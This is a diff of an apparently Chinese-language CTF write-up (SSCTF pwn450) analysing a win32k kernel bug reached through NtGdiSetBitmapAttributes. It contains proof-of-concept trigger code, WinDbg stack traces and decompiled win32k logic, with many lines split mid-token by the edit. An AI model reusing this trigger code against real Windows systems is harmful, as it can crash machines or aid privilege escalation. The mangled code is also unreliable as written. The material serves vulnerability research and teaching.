@@ -5,12 +5,10 @@
 
 
 ```
-"C:Program FilesDebugging Tools for Windows (x86)ntsd.exe" -ddefer -y C:UsersrootDesktopSSCTFpwn450.pdb C:UsersrootDesktopSSCTFpwn450.exe
-```
-
-
-
-```
+"C:
+Program FilesDebugging Tools for Windows (x86)ntsd.exe" -ddefer -y C:
+UsersrootDesktopSSCTFpwn450.pdb C:
+UsersrootDesktopSSCTFpwn450.exe
 /**
 
 * Author: bee13oy of CloverSec Labs
@@ -21,11 +19,11 @@
 
 **/
 
-#include <Windows.h>
+    #include <Windows.h>
 
-#pragma comment(lib, "gdi32.lib")
+    #pragma comment(lib, "gdi32.lib")
 
-#pragma comment(lib, "user32.lib")
+    #pragma comment(lib, "user32.lib")
 
 unsigned int demo_CreateBitmapIndirect(void) {
 
@@ -45,7 +43,7 @@ unsigned int demo_CreateBitmapIndirect(void) {
 
 }
 
-#define eSyscall_NtGdiSetBitmapAttributes 0x1110
+    #define eSyscall_NtGdiSetBitmapAttributes 0x1110
 
 W32KAPI HBITMAP NTAPI NtGdiSetBitmapAttributes(
 
@@ -112,11 +110,6 @@ int _tmain(int argc, _TCHAR* argv[])
  return 0;
 
 }
-```
-
-
-
-```
 kd> g
 
 Breakpoint 0 hit
@@ -127,7 +120,7 @@ win32k!EngPaint:
 
 kd> kb
 
- # ChildEBP RetAddr Args to Child 
+ # ChildEBP RetAddr Args to Child
 
 00 90b37a54 9aacbb9d fe723018 90b37a7c 90b37af8 win32k!EngPaint
 
@@ -149,7 +142,7 @@ win32k!bGetRealizedBrush:
 
 kd> kb
 
- # ChildEBP RetAddr Args to Child 
+ # ChildEBP RetAddr Args to Child
 
 00 90b379a0 9a9d34af fd4d4d98 90b37af8 9a9cd5a0 win32k!bGetRealizedBrush
 
@@ -195,9 +188,9 @@ fe723078 00000000 00000000 00000000 00000000
 
 fe723008 + 1ch = 0
 
-fe723018 位置就是 SURFOBJ 结构体 
+fe723018 位置就是 SURFOBJ 结构体
 
-fe723008 + 1ch 实际上就是 SURFOBJ + c 
+fe723008 + 1ch 实际上就是 SURFOBJ + c
 
 kd> g
 
@@ -209,7 +202,7 @@ win32k!bGetRealizedBrush+0x38:
 
 kd> kb
 
- # ChildEBP RetAddr Args to Child 
+ # ChildEBP RetAddr Args to Child
 
 00 90b379a0 9a9d34af 00000000 00000000 9a9cd5a0 win32k!bGetRealizedBrush+0x38
 
@@ -224,12 +217,8 @@ kd> kb
 838aba40 8b99f8010000 mov ebx,dword ptr [ecx+1F8h]
 
 838abb98 e8fafaffff call win32k!EngPaint (838ab697)
-```
-
-
-
-```
-if ( v4 != (HDEV)SURFACE::pdibDefault )
+if ( v4 != (HDEV)SURFACE::
+pdibDefault )
 
  {
 
@@ -237,7 +226,8 @@ if ( v4 != (HDEV)SURFACE::pdibDefault )
 
  ++*((_DWORD *)v4 + 0x1A);
 
- if ( !SURFACE::bStockSurface((SURFACE *)v4) )
+ if ( !SURFACE::
+bStockSurface((SURFACE *)v4) )
 
  {
 
@@ -248,16 +238,12 @@ if ( v4 != (HDEV)SURFACE::pdibDefault )
  }
 
  }
-```
-
-
-
-```
 v19 = v6;
 
  if ( *((_DWORD *)v15[0] + 5) != 1
 
- || *((_DWORD *)v4 + 26) && !SURFACE::bStockSurface((SURFACE *)v4) && *((_DWORD *)v4 + 25) != *(_DWORD *)v5
+ || *((_DWORD *)v4 + 26) && !SURFACE::
+bStockSurface((SURFACE *)v4) && *((_DWORD *)v4 + 25) != *(_DWORD *)v5
 
  || !bIsCompatible((struct PALETTE **)&a1, *((struct PALETTE **)v4 + 20), (struct SURFACE *)v4, v19, 1) ) // bIsCompatible检查不通过
 
